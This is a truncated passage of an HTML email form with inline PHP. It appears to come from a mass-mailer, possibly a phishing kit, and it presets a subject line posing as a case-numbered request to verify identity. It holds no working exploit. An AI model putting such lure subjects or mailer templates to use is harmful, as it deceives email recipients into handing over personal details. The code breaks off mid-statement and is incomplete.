	...
	<td><input name="from" type="text" value="" size="40" /></td>

	</tr>
	<tr>

	<td><span class="style5">Subject:</span></td>
	<td><input name="subject" value="<? $Taz = rand(0,9999); $subject = '[Reply] Case #7856879565 required request to verify identity'; $gass ='';
